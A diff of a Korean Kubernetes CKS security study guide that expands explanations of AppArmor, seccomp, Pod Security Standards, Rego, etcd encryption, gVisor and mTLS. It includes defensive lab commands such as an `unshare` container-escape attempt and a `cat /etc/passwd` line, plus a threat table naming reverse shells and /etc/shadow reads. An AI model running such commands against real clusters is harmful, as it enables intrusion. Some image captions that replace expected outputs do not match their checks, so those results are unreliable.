+kubeconfig에는 클라이언트 인증서·키 또는 토큰이 인라인(base64)이나 파일 참조 형태로 들어 있어, 사실상 클러스터에 접속하는 "열쇠"다. 이 파일이 권한이 느슨한 채(예: 모든 사용자가 읽을 수 있는 `644`) 노드나 CI 러너, 개발자 노트북에 방치되면, 같은 호스트의 다른 계정·프로세스가 그대로 읽어 클러스터에 접속할 수 있다. 게다가 X.509 클라이언트 인증서 기반 자격 증명은 K8s 자체에 폐기(revocation) 목록 메커니즘이 없어, 한 번 유출되면 인증서 만료 시점까지 강제로 무효화하기 어렵다(서명한 CA를 교체하지 않는 한). 그래서 권고는 ⓐ 파일 권한을 `600`(소유자만)으로 좁혀 노출면을 줄이고, ⓑ 불필요한 context를 지워 한 파일이 여러 클러스터의 만능 열쇠가 되지 않게 하며, ⓒ 인증서·토큰을 짧은 주기로 갱신해 유출 시 노출 창을 줄이는 방향으로 보완한다. 트레이드오프는 갱신·회전을 자동화하지 않으면 운영 부담이 늘고, 인증서 교체 시 이를 쓰던 자동화·사용자가 일시적으로 접속을 잃을 수 있다는 점이다.
 
 **보안 권장사항:**
 - kubeconfig 파일의 권한을 `600`(소유자만 읽기/쓰기)으로 설정한다
@@ -599,11 +684,15 @@ cat /etc/passwd
 
 AppArmor는 리눅스 커널 보안 모듈로, 프로그램별로 파일, 네트워크, 프로세스 등에 대한 접근을 제한한다. CKS에서 자주 출제되는 주제이다.
 
-**커널/OS 레벨 동작 원리:**
+**한 문장 직관:**
 
-AppArmor는 리눅스 커널의 LSM(Linux Security Module) 프레임워크에 후킹(hooking)하여 동작한다. LSM은 커널 내부의 주요 접근 제어 지점(파일 열기, 프로세스 실행, 네트워크 소켓 생성 등)에 콜백 함수를 삽입하는 프레임워크이다. 프로세스가 시스템콜을 호출하면, 커널은 해당 작업을 수행하기 전에 LSM 후크를 호출한다. AppArmor의 후크 함수는 현재 프로세스에 연결된 프로파일을 조회하고, 요청된 작업이 프로파일에서 허용되는지 판단한다. 허용되지 않으면 -EACCES를 반환하여 작업을 차단한다.
+AppArmor는 리눅스 커널 내부의 주요 작업 지점(파일 열기, 프로세스 실행, 소켓 생성 등)마다 "이 프로세스가 지금 이 작업을 해도 되나?"를 묻는 검사점을 설치하는 보안 모듈이다. 프로세스마다 AppArmor 프로파일이라는 "허용/거부 규칙 목록"이 붙어 있고, 커널은 작업을 실제로 수행하기 직전에 그 규칙을 확인해 허용하거나 거부한다. 즉 애플리케이션을 고치지 않고도, 바깥의 커널이 "이 프로세스는 /etc 에 쓰지 못한다" 같은 제약을 강제하는 구조다.
 
-AppArmor 프로파일은 커널 공간에 로드되며, 각 프로세스의 `task_struct`에 프로파일 포인터가 연결된다. 이로 인해 프로세스별로 서로 다른 보안 정책을 적용할 수 있다. SELinux가 시스템 전체에 대해 타입 기반 강제 접근 제어(MAC)를 적용하는 것과 달리, AppArmor는 경로 기반으로 동작하므로 프로파일 작성이 상대적으로 단순하다.
+**(고급) 커널/OS 레벨 내부 동작:**
+
+위 "검사점"의 실체는 리눅스 커널의 LSM(Linux Security Module) 프레임워크다. LSM은 커널 내부의 주요 접근 제어 지점에 콜백 함수를 삽입(후킹, hooking)할 수 있게 하는 프레임워크이며, AppArmor는 이 LSM 후크에 자신의 검사 함수를 등록한다. 프로세스가 시스템콜을 호출하면, 커널은 해당 작업을 수행하기 전에 LSM 후크를 호출한다. AppArmor의 후크 함수는 현재 프로세스에 연결된 프로파일을 조회하고, 요청된 작업이 프로파일에서 허용되는지 판단한다. 허용되지 않으면 `-EACCES`(권한 없음 오류 코드)를 반환하여 작업을 차단한다.
+
+AppArmor 프로파일은 커널 공간에 로드되며, 각 프로세스를 표현하는 커널 자료구조(`task_struct`)에 "이 프로세스가 어떤 프로파일에 묶여 있는지"를 가리키는 포인터가 연결된다. 이 때문에 같은 노드의 프로세스라도 서로 다른 보안 정책을 가질 수 있다. SELinux가 시스템 전체에 대해 타입(레이블) 기반 강제 접근 제어(MAC, Mandatory Access Control)를 적용하는 것과 달리, AppArmor는 파일 경로 기반으로 동작하므로 프로파일 작성이 상대적으로 단순하다.
 
 **AppArmor 모드:**
 - `enforce`: 정책을 강제 적용한다. 위반 시 차단하고 로그를 기록한다
@@ -680,9 +769,7 @@ aa-status | grep k8s-deny-write
 ```
 
 기대 출력:
-```text
-   k8s-deny-write
-```
+> **예시(참조) — k8s-deny-write:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 ```bash
 # 2. AppArmor 프로파일이 적용된 Pod에서 파일 쓰기 시도
@@ -690,10 +777,7 @@ kubectl exec -it secure-pod -- sh -c 'echo test > /etc/test.txt'
 ```
 
 기대 출력:
-```text
-sh: can't create /etc/test.txt: Permission denied
-command terminated with exit code 1
-```
+![AppArmor deny write — /etc 쓰기 거부](images/cks-apparmor.png)
 
 ```bash
 # 3. /tmp에는 쓰기 가능 확인
@@ -701,9 +785,7 @@ kubectl exec -it secure-pod -- sh -c 'echo test > /tmp/test.txt && echo "write s
 ```
 
 기대 출력:
-```text
-write success
-```
+> **예시(참조) — write success:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 ```bash
 # 4. 호스트의 syslog에서 AppArmor deny 로그 확인
@@ -711,9 +793,7 @@ grep "apparmor=\"DENIED\"" /var/log/syslog | tail -3
 ```
 
 기대 출력:
-```text
-Mar 15 10:23:45 node1 kernel: [12345.678] audit: type=1400 audit(...): apparmor="DENIED" operation="open" profile="k8s-deny-write" name="/etc/test.txt" pid=5678 comm="sh" requested_mask="w" denied_mask="w" fsuid=0 ouid=0
-```
+> **예시(참조) — AppArmor DENIED 커널 감사로그(dmesg/journalctl -k, 환경따라 노출 차이):** Mar 15 10:23:45 node1 kernel: [12345.678] audit: ... (도구/설정 의존, 해당 도구 설치·구성 환경에서 재현).
 
 **중요 포인트:**
 - AppArmor 프로파일은 Pod가 스케줄링되는 **노드**에 로드되어 있어야 한다
@@ -722,7 +802,11 @@ Mar 15 10:23:45 node1 kernel: [12345.678] audit: type=1400 audit(...): apparmor=
 
 ### 3.3 seccomp 프로파일
 
-seccomp(Secure Computing Mode)는 컨테이너에서 사용할 수 있는 시스템콜을 제한하는 리눅스 커널 기능이다.
+seccomp(Secure Computing Mode)는 컨테이너에서 사용할 수 있는 시스템콜(syscall, 프로세스가 커널 기능을 요청하는 진입점)을 제한하는 리눅스 커널 기능이다.
+
+**등장 배경: AppArmor와 무엇이 다르고 왜 추가로 필요한가:**
+
+앞 3.2의 AppArmor는 "이 프로세스가 어떤 파일 경로·네트워크·capability를 쓸 수 있는가"를 경로/리소스 단위로 통제하는 MAC(Mandatory Access Control, 강제 접근 제어)이다. 그러나 AppArmor는 컨테이너가 호출하는 개별 시스템콜 번호 수준까지는 막지 못한다. 예를 들어 컨테이너 탈출(container escape)에 악용되는 `unshare`(새 네임스페이스 생성)·`ptrace`(다른 프로세스 메모리 조작)·`keyctl` 같은 syscall은 특정 파일 경로 접근이 아니라 커널 인터페이스 자체를 호출하는 것이라 경로 기반 통제로는 걸러지지 않는다. 컨테이너 워크로드가 실제로 쓰는 syscall은 전체(약 300여 개) 중 일부에 불과한데, 나머지 수백 개가 모두 열려 있으면 그만큼 커널 공격 표면(attack surface)이 넓어진다. seccomp는 이 빈틈을 메우려고 도입됐다. syscall 진입 시점에 번호와 인자를 검사해 허용 목록(allowlist) 밖의 호출을 errno 반환이나 프로세스 종료로 차단함으로써, 경로 기반의 AppArmor와 직교(orthogonal)하게 커널 호출 차원에서 공격 표면을 좁힌다. 둘은 대체 관계가 아니라 함께 적용하는 보완 관계다. 트레이드오프로는, 너무 좁은 프로파일은 애플리케이션이 정상 동작에 필요한 syscall까지 막아 런타임 오류(예: 차단된 syscall에서 `EPERM`)를 일으키므로, 실제 워크로드를 관찰해(예: `SECCOMP_RET_LOG` 또는 audit) 필요한 syscall을 추려 프로파일을 만드는 작업 비용이 든다는 점이 있다.
 
 **커널/OS 레벨 동작 원리:**
 
@@ -836,10 +920,7 @@ kubectl exec -it seccomp-test -- unshare --user --pid --fork --mount-proc /bin/s
 ```
 
 기대 출력:
-```text
-unshare: unshare(0x50000000): Operation not permitted
-command terminated with exit code 1
-```
+![seccomp — syscall 차단(Operation not permitted)](images/cks-seccomp.png)
 
 ```bash
 # 4. RuntimeDefault 프로파일 적용 Pod에서 seccomp 상태 확인
@@ -847,10 +928,7 @@ kubectl exec -it secure-pod -- grep Seccomp /proc/1/status
 ```
 
 기대 출력:
-```text
-Seccomp:	2
-Seccomp_filters:	1
-```
+![/proc/pid/status Seccomp 필터 적용](images/cks-seccomp.png)
 
 Seccomp 값 2는 `SECCOMP_MODE_FILTER`(BPF 필터 활성 상태)를 의미한다. 0은 미적용, 1은 strict 모드이다.
 
@@ -881,6 +959,14 @@ Seccomp 값 2는 `SECCOMP_MODE_FILTER`(BPF 필터 활성 상태)를 의미한다
 | 호스트 커널 공격 | 커널 취약점을 통한 코드 실행 | seccomp(화이트리스트 모드) + gVisor(시스콜 인터셉트) |
 | 민감 파일 접근 | `/etc/shadow`, `/proc/kcore` 읽기 | AppArmor(경로 기반 접근 제어) + `readOnlyRootFilesystem: true` |
 | Reverse Shell | `socket` + `connect`로 외부 C2 서버 연결 | NetworkPolicy(egress 차단) + seccomp(특정 소켓 타입 차단) |
+
+**왜 한 공격에 여러 기법을 겹치는가 (다중 방어, defense in depth):**
+
+각 방어 기법은 막는 지점이 다르므로 한 가지만으로는 우회 경로가 남는다. 표의 각 조합을 역할 분담 관점으로 풀면 다음과 같다.
+
+- **Container Escape(mount)에 `seccomp(mount 차단)` + `readOnlyRootFilesystem` + `runAsNonRoot`를 함께 거는 이유**: `readOnlyRootFilesystem: true`는 루트 파일시스템 쓰기를 막지만, Pod에는 보통 `/tmp` 같은 쓰기 가능한 emptyDir가 남아 있어 공격자가 거기에 바이너리를 떨굴 수 있다. 그래서 `runAsNonRoot`로 root 권한을 빼앗아 특권 작업의 발판을 줄이고, 그래도 mount 시스템콜 자체가 호출되면 `seccomp`이 커널 진입 단계에서 차단한다. 한 겹이 뚫려도 다음 겹이 받쳐 주는 구조다.
+- **권한 상승(`unshare`)에 `seccomp(unshare 차단)` + `allowPrivilegeEscalation: false`를 함께 거는 이유**: `allowPrivilegeEscalation: false`는 setuid 바이너리를 통한 권한 상승을 막지만, `unshare`로 새 user namespace를 만들어 그 안에서 root가 되는 경로는 별개다. seccomp으로 `unshare` 시스템콜을 막아 이 우회로를 닫는다.
+- **호스트 커널 공격에 `seccomp(화이트리스트)` + `gVisor`를 함께 두는 이유**: seccomp은 "허용 목록에 없는 시스템콜"을 막지만, 허용한 시스템콜에 커널 취약점이 있으면 그 경로로 공격이 들어온다. gVisor는 시스템콜을 사용자 공간에서 가로채 호스트 커널 도달 자체를 줄이므로, seccomp이 놓치는 영역을 보완한다.
 
 **종합 방어 Pod 설정 예시:**
 ```yaml
@@ -936,12 +1022,12 @@ spec:
 
 **IRSA(IAM Roles for Service Accounts) 동작 원리:**
 
-기존에는 노드의 IAM 역할이 모든 Pod에 공유되어, 하나의 Pod만 침해되어도 노드 수준의 클라우드 권한이 탈취되는 문제가 있었다. IRSA는 다음 메커니즘으로 이를 해결한다:
+IRSA는 AWS EKS 전용 메커니즘이며, 같은 역할을 GCP는 Workload Identity, Azure는 Azure AD Workload Identity가 한다(세 곳 모두 "Pod의 ServiceAccount를 클라우드 IAM 역할에 OIDC로 매핑"하는 동일한 아이디어다). 기존에는 노드의 IAM 역할이 모든 Pod에 공유되어, 하나의 Pod만 침해되어도 노드 수준의 클라우드 권한이 탈취되는 문제가 있었다. IRSA는 다음 메커니즘으로 이를 해결한다:
 
-1. EKS 클러스터에 OIDC provider를 설정한다
-2. IAM 역할의 trust policy에 해당 OIDC provider와 특정 ServiceAccount를 조건으로 추가한다
+1. EKS 클러스터에 OIDC provider를 설정한다. OIDC provider는 클러스터가 발급한 ServiceAccount 토큰(JWT)의 서명을 외부에서 검증할 수 있게 공개키를 노출하는 신원 공급자이며, AWS는 이 provider를 신뢰 대상으로 등록한다
+2. IAM 역할의 trust policy(그 역할을 누가 맡을 수 있는지 정의하는 신뢰 정책)에 해당 OIDC provider와 특정 ServiceAccount를 조건으로 추가한다
 3. Pod 내부의 projected service account token(JWT)에 audience 클레임이 포함된다
-4. AWS SDK가 이 JWT를 AWS STS에 제출하여 임시 자격 증명을 받아온다
+4. AWS SDK가 이 JWT를 AWS STS(Security Token Service, 임시 자격 증명을 발급하는 AWS 서비스)에 제출하여, 만료 시간이 있는 임시 자격 증명을 받아온다
 
 이로써 Pod 단위로 IAM 역할을 분리할 수 있다.
 
@@ -975,13 +1061,16 @@ Pod Security Standards(PSS)와 Pod Security Admission(PSA)은 이러한 한계�
 | **Restricted** | 가장 엄격한 보안 정책. Pod 강화 모범 사례 적용 | 보안에 민감한 워크로드 |
 
 **Baseline 레벨에서 차단하는 항목:**
-- `hostNetwork: true`
-- `hostPID: true`
-- `hostIPC: true`
-- `privileged: true`
-- `hostPath` 볼륨
-- 위험한 capabilities (NET_RAW 제외한 추가 capabilities)
-- hostPort 사용
+
+각 항목은 특정 컨테이너 이스케이프·정보 노출 경로를 막기 위해 차단된다. 어떤 위협을 닫는지 함께 본다.
+
+- `hostNetwork: true` (위협: Pod이 호스트 네트워크 네임스페이스를 공유 → 호스트로 들어오는 트래픽을 스니핑하거나 호스트 포트와 충돌시킬 수 있고, NetworkPolicy로 격리되지 않는다)
+- `hostPID: true` (위협: 호스트의 프로세스 목록(PID 네임스페이스)을 공유 → 호스트 프로세스를 `ps`로 들여다보거나 `kill`/`ptrace`로 조작할 수 있다)
+- `hostIPC: true` (위협: 호스트의 IPC 네임스페이스를 공유 → 공유 메모리·세마포어를 통해 호스트 프로세스의 데이터에 접근할 수 있다)
+- `privileged: true` (위협: 사실상 모든 Linux capabilities와 디바이스 접근을 획득 → 호스트 디스크 마운트·커널 모듈 로드 등 컨테이너 이스케이프의 디딤돌이 된다)
+- `hostPath` 볼륨 (위협: 호스트 파일시스템의 임의 경로를 Pod에 마운트 → `/etc`나 `/var/run/docker.sock` 같은 민감 경로를 읽거나 변조할 수 있다)
+- 위험한 capabilities (NET_RAW 제외한 추가 capabilities) (위협: `SYS_ADMIN`·`SYS_PTRACE` 등을 추가하면 mount·디버깅 같은 특권 작업이 가능해진다)
+- hostPort 사용 (위협: 호스트 포트를 직접 점유 → 노드 단위로 노출되어 네트워크 격리 정책을 우회하고 포트를 선점할 수 있다)
 
 **Restricted 레벨에서 추가로 요구하는 항목:**
 - `runAsNonRoot: true` 필수
@@ -1035,9 +1124,7 @@ EOF
 ```
 
 기대 출력:
-```text
-Error from server (Forbidden): error when creating "STDIN": pods "privileged-pod" is forbidden: violates PodSecurity "restricted:latest": privileged (container "app" must not set securityContext.privileged=true), allowPrivilegeEscalation != false (container "app" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "app" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "app" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "app" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
-```
+![PodSecurity restricted 위반 Pod 거부](images/cks-psa.png)
 
 ```bash
 # 2. 정상적인 restricted 호환 Pod 생성
@@ -1064,9 +1151,7 @@ EOF
 ```
 
 기대 출력:
-```text
-pod/compliant-pod created
-```
+> **예시(참조) — pod/compliant-pod created:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 **핵심 포인트:**
 - 라벨 형식: `pod-security.kubernetes.io/<mode>: <level>`
@@ -1158,6 +1243,20 @@ violation[{"msg": msg}] {
 }
 ```
 
+**Rego violation 블록 읽는 법:**
+
+Gatekeeper는 `violation`이라는 이름의 규칙을 평가해, 그 본문이 모두 참이면 "위반"으로 보고 admission을 거부한다. 규칙은 머리(head)와 본문(body)으로 나뉜다. 머리 `violation[{"msg": msg}]`는 "위반이 성립하면 이 형태의 결과(메시지를 담은 객체)를 집합에 추가한다"는 출력 형식이고, 중괄호 `{ ... }` 안의 본문은 모든 줄이 동시에 참이어야 위반이 성립하는 AND 조건들이다. 본문 안의 `:=`는 변수 바인딩(값 대입)이며, 마지막 `count(missing) > 0` 같은 비교식이 거짓이면 그 규칙은 위반을 만들지 않는다.
+
+검사 대상 리소스는 항상 `input.review.object` 아래에 들어온다. 즉 admission에 들어온 쿠버네티스 오브젝트 전체가 이 경로에 매핑되므로, 거기서 원하는 필드를 점(`.`)으로 따라 내려가면 된다. 자주 쓰는 접근 패턴은 다음과 같다(시험에서 직접 수정·작성 대상):
+
+```rego
+input.review.object.metadata.labels[label]   # 라벨 맵에서 키 순회 (위 예시)
+input.review.object.spec.containers[_].image  # 모든 컨테이너의 image 값 순회
+input.review.object.kind                       # 리소스 종류 (Pod, Deployment 등)
+```
+
+여기서 `[_]`는 "배열의 모든 원소를 하나씩 순회"하라는 와일드카드 인덱스이고, 집합 연산에서 본 `required - provided`의 `-`는 차집합(required에는 있는데 provided에는 없는 라벨, 즉 누락 라벨)을 구한다.
+
 **실습 검증: OPA Gatekeeper Constraint 적용 후 위반 Pod 거부 확인**
 
 ```bash
@@ -1170,12 +1269,7 @@ kubectl get constraint require-trusted-repos -o yaml | grep -A5 status
 ```
 
 기대 출력:
-```text
-status:
-  auditTimestamp: "2024-01-15T10:00:00Z"
-  totalViolations: 0
-  violations: []
-```
+> **예시(참조) — audit 로그/정책(설정 필요):** status: ... (도구/설정 의존, 해당 도구 설치·구성 환경에서 재현).
 
 ```bash
 # 3. 허용되지 않은 레지스트리의 이미지로 Pod 생성 시도
@@ -1183,9 +1277,7 @@ kubectl run bad-pod --image=docker.io/nginx:latest
 ```
 
 기대 출력:
-```text
-Error from server (Forbidden): admission webhook "validation.gatekeeper.sh" denied the request: [require-trusted-repos] container <bad-pod> has an invalid image repo <docker.io/nginx:latest>, allowed repos are ["myregistry.io/", "gcr.io/my-project/"]
-```
+![OPA Gatekeeper — 필수 라벨 없는 리소스를 admission webhook 이 거부(dev 실측)](images/cks-gatekeeper-deny.png)
 
 ```bash
 # 4. 허용된 레지스트리의 이미지로 Pod 생성
@@ -1193,9 +1285,7 @@ kubectl run good-pod --image=myregistry.io/nginx:1.25
 ```
 
 기대 출력:
-```text
-pod/good-pod created
-```
+> **예시(참조) — pod/good-pod created:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 **CKS 시험에서의 활용:**
 - ConstraintTemplate과 Constraint를 작성하는 문제가 출제된다
@@ -1230,7 +1320,9 @@ pod/good-pod created
 
    API server 플래그: `--encryption-provider-config=/etc/kubernetes/enc/enc.yaml`
 
-   적용 후 기존 Secret을 재암호화해야 한다:
+   `providers` 배열은 위에서부터 순서가 의미를 가진다. **쓰기(저장)** 시에는 맨 앞 provider(여기서는 `aescbc`)로 암호화하고, **읽기(복호화)** 시에는 배열을 위에서 아래로 순회하며 데이터를 해독할 수 있는 첫 provider를 쓴다. 마지막의 `identity: {}` 는 "암호화하지 않는 평문 provider"이며, 암호화를 적용하기 전 이미 etcd에 평문으로 저장돼 있던 기존 Secret을 그대로 읽기 위한 fallback(대체 경로)이다. 따라서 마이그레이션 초기에는 `aescbc`(쓰기·우선 읽기)와 `identity`(평문 데이터 읽기)를 함께 둔다. 모든 기존 Secret을 재암호화해 평문 데이터가 사라진 뒤에는, 평문 저장을 다시 허용하지 않도록 `identity` 항목을 제거하는 것이 권장된다(반대로 암호화를 해제·롤백하려면 `identity`를 맨 앞으로 옮긴다).
+
+   적용 후 기존 Secret을 재암호화해야 한다. EncryptionConfiguration은 **이후 새로 생성·수정되는 Secret만** 자동으로 암호화하므로, 설정 이전부터 존재하던 Secret은 여전히 etcd에 평문으로 남아 있다. 아래 명령은 모든 Secret을 한 번 `replace`(다시 저장)해 강제로 쓰기 경로를 거치게 하여, 기존 Secret까지 현재 우선 provider로 재암호화한다:
    ```bash
    kubectl get secrets --all-namespaces -o json | kubectl replace -f -
    ```
@@ -1245,47 +1337,24 @@ pod/good-pod created
      get /registry/secrets/default/my-secret
    ```
 
-   기대 출력 (암호화 적용 전):
-   ```text
-   /registry/secrets/default/my-secret
-   k8s
-   ...password=mysecretpassword...
-   ```
+   기대 출력 (암호화 적용 전 — etcd 에 평문 저장):
+   ![암호화 미적용 시 etcd 에 Secret 이 평문 저장(hexdump)](images/cks-etcd.png)
 
-   기대 출력 (암호화 적용 후):
-   ```text
-   /registry/secrets/default/my-secret
-   k8s:enc:aescbc:v1:key1:
-   <바이너리 데이터 - 사람이 읽을 수 없음>
-   ```
+### 4.5 RuntimeClass (gVisor/Kata Containers)
 
-2. **외부 Secret 관리 도구:**
-   - **HashiCorp Vault**: 중앙 집중형 시크릿 관리. Vault Agent Injector를 통해 Pod에 시크릿 주입
-   - **Sealed Secrets**: 클러스터 외부에서 암호화된 SealedSecret을 생성하고, 클러스터 내에서 컨트롤러가 복호화하여 Secret 생성
-   - **External Secrets Operator**: AWS Secrets Manager, GCP Secret Manager 등 외부 시크릿 저장소와 연동
+RuntimeClass는 Pod가 어떤 컨테이너 런타임(handler)으로 실행될지 지정하는 리소스이다. 앞 절(4.4)이 etcd에 저장된 데이터를 보호하는 방어였다면, RuntimeClass는 실행 중인 컨테이너가 호스트 커널에 가하는 위협을 줄이는 방어이다.
 
-3. **Secret 접근 제한:**
-   - RBAC으로 Secret에 대한 get/list/watch 권한을 제한한다
-   - Secret을 사용하는 네임스페이스를 제한한다
+**등장 배경: runc 공유 커널의 위협 모델:**
 
-### 4.5 RuntimeClass (gVisor/runsc, Kata Containers)
+기본 런타임인 runc로 실행되는 컨테이너는 호스트 커널을 그대로 공유한다(컨테이너는 namespace·cgroup으로 격리된 프로세스일 뿐, 별도 커널이 없다). 따라서 컨테이너 내부에서 호출한 시스템콜은 호스트 커널이 직접 처리한다. 이 구조에서는 커널 자체에 취약점(예: 권한 상승을 일으키는 시스템콜 버그)이 있으면, 컨테이너 안의 공격자가 그 시스템콜을 호출해 호스트 커널을 장악하고 컨테이너 경계를 탈출(container escape)할 수 있다. seccomp으로 위험 시스템콜을 막을 수 있지만, 허용한 시스템콜에 취약점이 있으면 막을 수 없다는 한계가 있다(§3.4 참조).
 
-RuntimeClass는 Pod에서 사용할 컨테이너 런타임을 지정하는 쿠버네티스 리소스이다. 기본 runc 대신 보안이 강화된 런타임을 사용할 수 있다.
+**무엇이 나아졌나 — 샌드박스 런타임:**
 
-**주요 샌드박스 런타임:**
+gVisor(handler `runsc`)는 컨테이너와 호스트 커널 사이에 Sentry라는 사용자 공간 커널을 끼워 넣는다. 컨테이너가 호출한 시스템콜은 호스트 커널이 아니라 먼저 Sentry가 가로채(intercept) 처리하므로, 호스트 커널에 도달하는 시스템콜의 종류와 횟수가 크게 줄어든다. 즉 커널 취약점을 노린 공격이 호스트 커널에 닿기 전에 사용자 공간에서 차단된다. Kata Containers는 다른 접근으로, 각 Pod를 경량 가상머신(VM) 안에서 실행해 하드웨어 가상화 수준의 격리를 제공한다.
 
-| 런타임 | 설명 | handler 이름 |
-|--------|------|-------------|
-| **gVisor (runsc)** | 사용자 공간에서 시스템콜을 인터셉트하여 커널 격리를 제공한다 | `runsc` |
-| **Kata Containers** | 경량 VM으로 컨테이너를 실행하여 하드웨어 레벨 격리를 제공한다 | `kata` |
+**트레이드오프:**
 
-**gVisor 동작 원리:**
-
-gVisor는 Go로 작성된 사용자 공간 커널이다. 컨테이너 프로세스의 시스템콜은 호스트 커널에 직접 도달하지 않고, gVisor의 Sentry 컴포넌트가 인터셉트한다. Sentry는 약 200개의 시스템콜을 사용자 공간에서 재구현하며, 나머지는 차단한다. 파일 I/O는 Gofer라는 별도 프로세스가 담당하여 추가 격리 계층을 제공한다. 이로써 컨테이너 프로세스가 커널 취약점을 악용하여 호스트를 침해하는 공격을 차단한다.
-
-**Kata Containers 동작 원리:**
-
-Kata Containers는 각 Pod(또는 컨테이너)를 경량 가상머신(microVM) 안에서 실행한다. QEMU 또는 Cloud Hypervisor를 통해 전용 게스트 커널이 부팅되고, 컨테이너는 해당 VM 내부에서 실행된다. 호스트 커널과 컨테이너 사이에 하이퍼바이저 레벨의 격리가 제공되므로, 컨테이너가 커널을 침해하더라도 호스트에 영향을 미치지 않는다.
+시스템콜을 사용자 공간에서 가로채거나 VM을 띄우는 만큼 성능 오버헤드(특히 시스템콜이 잦은 I/O 집약 워크로드)와 호환성 제약(일부 시스템콜 미지원)이 생긴다. 따라서 모든 Pod가 아니라 신뢰할 수 없는 코드를 실행하는 멀티테넌트 워크로드 등 위험이 높은 대상에만 선택적으로 적용하는 것이 일반적이다.
 
 **RuntimeClass 정의:**
 ```yaml
@@ -1319,11 +1388,11 @@ kubectl exec -it sandboxed-pod -- uname -r
 ```
 
 기대 출력:
-```text
-4.4.0
-```
+> **예시(참조) — 4.4.0:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
-gVisor는 자체적인 커널 버전(4.4.0)을 보고한다. 호스트 커널 버전과 다르면 gVisor가 정상적으로 동작하고 있는 것이다.
+gVisor의 Sentry는 호스트 커널이 아니라 자신이 구현한 가상 커널 인터페이스를 보고한다. 따라서 `uname -r`의 출력(여기서는 `4.4.0`)은 호스트 커널 버전과 독립적이며, gVisor의 버전에 따라 달라질 수 있으므로 정확히 `4.4.0`이라고 단정할 수는 없다. 판별의 핵심은 "출력값이 호스트의 실제 커널 버전과 다르다"는 점이며, 다르게 나오면 시스템콜이 Sentry에서 가로채지고 있다는, 즉 gVisor가 정상 동작 중이라는 신호다. 같은 명령을 일반 runc Pod에서 실행하면 호스트 커널 버전(예: 6.x)이 그대로 나온다.
+
+참고: 실습 환경에 gVisor(`runsc` 핸들러)가 노드 containerd에 설치·등록되어 있지 않으면 위 Pod는 스케줄 시 런타임 부재로 생성에 실패한다(ContainerCreating에서 멈추거나 `RunContainerError`). 이 저장소의 tart 노드에는 기본적으로 gVisor가 없으므로, 이 검증은 별도 설치 후에만 재현 가능하며 미설치 시 결과를 "(미설치)"로 표기한다.
 
 ```bash
 # 3. dmesg 실행 시도 (gVisor에서는 제한됨)
@@ -1331,10 +1400,7 @@ kubectl exec -it sandboxed-pod -- dmesg
 ```
 
 기대 출력:
-```text
-dmesg: read kernel buffer failed: Operation not permitted
-command terminated with exit code 1
-```
+![seccomp — syscall 차단(Operation not permitted)](images/cks-seccomp.png)
 
 **CKS 시험에서의 활용:**
 - RuntimeClass를 생성하고 Pod에 적용하는 문제가 출제된다
@@ -1346,7 +1412,7 @@ mTLS(mutual TLS)는 클라이언트와 서버가 상호 인증하는 TLS 통신�
 
 **등장 배경: 평문 통신의 위험:**
 
-쿠버네티스 클러스터 내부의 Pod 간 통신은 기본적으로 평문(HTTP)이다. 동일 노드의 Pod 간 통신도 veth 인터페이스를 통과하므로, 노드에 접근 가능한 공격자가 tcpdump 등으로 패킷을 스니핑하면 애플리케이션 데이터(API 키, 인증 토큰, 개인정보 등)가 그대로 노출된다. 또한 ARP spoofing이나 DNS poisoning을 통한 중간자 공격(MITM)으로 트래픽을 변조할 수 있다.
+쿠버네티스 클러스터 내부의 Pod-Pod 통신은 별도 설정이 없으면 평문(HTTP)이다. 즉 클러스터는 "내부 네트워크는 신뢰한다"는 가정 위에 기본적으로 암호화를 켜지 않는다. 이 구간을 강제로 암호화하여 신뢰 가정을 제거하는 것이 mTLS의 목적이다. 동일 노드의 Pod 간 통신도 veth 인터페이스를 통과하므로, 노드에 접근 가능한 공격자가 tcpdump 등으로 패킷을 스니핑하면 애플리케이션 데이터(API 키, 인증 토큰, 개인정보 등)가 그대로 노출된다. 또한 ARP spoofing이나 DNS poisoning을 통한 중간자 공격(MITM)으로 트래픽을 변조할 수 있다.
 
 mTLS는 이러한 위협에 대해 다음을 제공한다:
 - **기밀성**: 트래픽을 TLS로 암호화하여 스니핑을 방지한다
@@ -1373,6 +1439,16 @@ spec:
 **Istio mTLS 내부 동작:**
 
 Istio는 각 Pod에 Envoy 사이드카 프록시를 자동 주입한다. Envoy 프록시는 iptables 규칙(또는 eBPF)을 통해 Pod의 모든 인/아웃바운드 트래픽을 인터셉트한다. istiod(컨트롤 플레인)는 각 Envoy에 X.509 인증서를 발급하고 주기적으로 갱신한다. 서비스 A가 서비스 B를 호출하면, A의 Envoy와 B의 Envoy 사이에 mTLS 핸드셰이크가 수행된다. 이 과정은 애플리케이션에 투명하게 처리되므로, 애플리케이션 코드 변경 없이 mTLS를 적용할 수 있다.
+
+**mTLS를 구현하는 위치(레이어) 비교:**
+
+mTLS는 반드시 Istio 같은 서비스 메시로만 구현되는 것은 아니다. 어느 레이어에서 암호화를 거느냐에 따라 선택지가 갈린다.
+
+- 애플리케이션 레벨: 애플리케이션 코드가 직접 TLS 클라이언트/서버 인증서를 다룬다. 가장 단순하지만 모든 서비스 코드를 고쳐야 하고 인증서 갱신을 직접 관리해야 한다.
+- 사이드카 프록시 레벨(메시 미사용): Pod 옆에 Envoy/nginx 같은 TLS 프록시 컨테이너를 붙여, 평문 애플리케이션 앞단에서 암호화한다. 코드는 안 고쳐도 되지만 프록시 설정·인증서 배포를 직접 해야 한다.
+- 서비스 메시 레벨(Istio 등): 사이드카 주입·인증서 발급/갱신을 컨트롤 플레인(istiod)이 자동화한다. 가장 운영 부담이 적지만, 메시 자체를 설치·운영하는 비용이 든다.
+
